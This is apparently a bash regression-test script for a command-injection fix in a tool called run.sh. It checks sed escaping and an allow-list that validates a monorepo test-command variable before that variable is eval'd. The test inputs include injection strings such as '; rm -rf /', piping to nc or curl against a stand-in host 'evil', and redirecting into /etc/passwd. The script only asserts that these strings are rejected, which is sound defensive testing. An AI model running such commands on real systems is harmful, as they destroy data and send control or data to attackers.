#!/usr/bin/env bash
#===============================================================================
# Regression tests for autonomy/run.sh v7.5.8 hardening:
#
#   A) sed-escape: project_name / project_path containing the sed delimiter
#      ('|') or other RHS-special chars ('&', '\\', '/') must not break the
#      generate_dashboard() substitution.
#
#   B) LOKI_MONOREPO_TEST_CMD whitelist: the env override is eval'd, so we
#      MUST reject anything outside [A-Za-z0-9_./= -] before eval. This test
#      sets the env var to "; rm -rf /" and confirms rejection.
#===============================================================================

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
RUN_SH="$REPO_ROOT/autonomy/run.sh"

PASS=0
FAIL=0

ok()   { printf 'PASS: %s\n' "$1"; PASS=$((PASS+1)); }
bad()  { printf 'FAIL: %s\n' "$1"; FAIL=$((FAIL+1)); }

#-------------------------------------------------------------------------------
# Test A: sed escape behaviour
#-------------------------------------------------------------------------------
# Replicate the exact escape expression used in run.sh and confirm that a
# project name containing the delimiter '|' does not break the substitution
# nor leak unescaped content into the output.

sed_escape() {
    printf '%s' "$1" | sed -e 's/[\\&|/]/\\&/g'
}

test_sed_escape_pipe() {
    local raw='evil|name<script>'
    local escaped
    escaped=$(sed_escape "$raw")
    # The pipe must now be backslash-escaped so it is treated as a literal in
    # the s|...|...| replacement RHS.
    if [[ "$escaped" == 'evil\|name<script>' ]]; then
        ok "sed_escape escapes pipe delimiter: $escaped"
    else
        bad "sed_escape pipe (got: $escaped)"
    fi

    # Run an actual sed substitution mimicking generate_dashboard and confirm
    # the escaped name lands in the output verbatim, no broken substitution.
    local input='Loki Mode</title>'
    local out
    out=$(printf '%s\n' "$input" | sed -e "s|Loki Mode</title>|Loki Mode - ${escaped}</title>|g")
    if [[ "$out" == "Loki Mode - evil|name<script></title>" ]]; then
        ok "sed substitution with escaped pipe yields literal pipe in output"
    else
        bad "sed substitution with pipe (got: $out)"
    fi
}

test_sed_escape_amp_and_backslash() {
    local raw='a&b\c/d'
    local escaped
    escaped=$(sed_escape "$raw")
    # & must be escaped (otherwise sed expands it to the matched text)
    # \ must be escaped (otherwise sed treats it as an escape introducer)
    # / must be escaped (defensive; not the delimiter here but kept for parity)
    if [[ "$escaped" == 'a\&b\\c\/d' ]]; then
        ok "sed_escape escapes &, \\, /: $escaped"
    else
        bad "sed_escape &/\\// (got: $escaped)"
    fi
}

#-------------------------------------------------------------------------------
# Test B: LOKI_MONOREPO_TEST_CMD whitelist
#-------------------------------------------------------------------------------
# We can't easily source run.sh in isolation (large dependency surface), so we
# replicate the exact validation expression used in run.sh and exercise it.

validate_monorepo_cmd() {
    local cmd="$1"
    if [[ ! "$cmd" =~ ^[A-Za-z0-9_./=\ -]+$ ]] || \
       echo "$cmd" | grep -qE '[;|`$]|&&|\|\||>>|<<'; then
        return 1
    fi
    return 0
}

assert_reject() {
    local desc="$1" cmd="$2"
    if validate_monorepo_cmd "$cmd"; then
        bad "should REJECT $desc: '$cmd'"
    else
        ok "rejects $desc: '$cmd'"
    fi
}

assert_accept() {
    local desc="$1" cmd="$2"
    if validate_monorepo_cmd "$cmd"; then
        ok "accepts $desc: '$cmd'"
    else
        bad "should ACCEPT $desc: '$cmd'"
    fi
}

test_monorepo_whitelist() {
    # The smoking-gun case from the task description:
    assert_reject "command-injection semicolon (rm -rf /)" "; rm -rf /"
    assert_reject "trailing rm -rf"                         "npm test ; rm -rf /"
    assert_reject "pipe injection"                          "npm test | nc evil 9000"
    assert_reject "command substitution \$()"               "npm test \$(curl evil)"
    assert_reject "backtick substitution"                   "npm test \`whoami\`"
    assert_reject "and-and chain"                           "npm test && curl evil"
    assert_reject "or-or chain"                             "npm test || curl evil"
    assert_reject "redirect out"                            "npm test >> /etc/passwd"
    assert_reject "redirect in"                             "npm test << EOF"
    assert_reject "newline injection"                       $'npm test\nrm -rf /'

    # Legitimate monorepo commands must still pass.
    assert_accept "pnpm recursive test"   "pnpm test --recursive"
    assert_accept "turbo test"            "npx turbo test"
    assert_accept "yarn workspace test"   "yarn workspaces run test"
    assert_accept "npm with env"          "NODE_ENV=test npm test"
}

#-------------------------------------------------------------------------------
# Sanity: confirm run.sh actually contains the new guard. This catches the
# regression where someone reverts the whitelist but leaves the test passing.
#-------------------------------------------------------------------------------
test_run_sh_contains_guard() {
    if grep -q 'LOKI_MONOREPO_TEST_CMD rejected (only \[A-Za-z0-9_./= -\] allowed)' "$RUN_SH"; then
        ok "run.sh contains LOKI_MONOREPO_TEST_CMD whitelist guard"
    else
        bad "run.sh missing LOKI_MONOREPO_TEST_CMD whitelist guard"
    fi
    if grep -q "sed -e 's/\[\\\\\\\\&|/\]/\\\\\\\\&/g'" "$RUN_SH"; then
        ok "run.sh contains sed-escape for project_name/project_path"
    else
        # Looser fallback check (handles shell-escape twists across platforms)
        if grep -q 'project_name_sed' "$RUN_SH" && grep -q 'project_path_sed' "$RUN_SH"; then
            ok "run.sh contains project_name_sed/project_path_sed escape locals"
        else
            bad "run.sh missing sed-escape for project_name/project_path"
        fi
    fi
}

#-------------------------------------------------------------------------------
# Run
#-------------------------------------------------------------------------------
test_sed_escape_pipe
test_sed_escape_amp_and_backslash
test_monorepo_whitelist
test_run_sh_contains_guard

printf '\n----\nResults: %d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
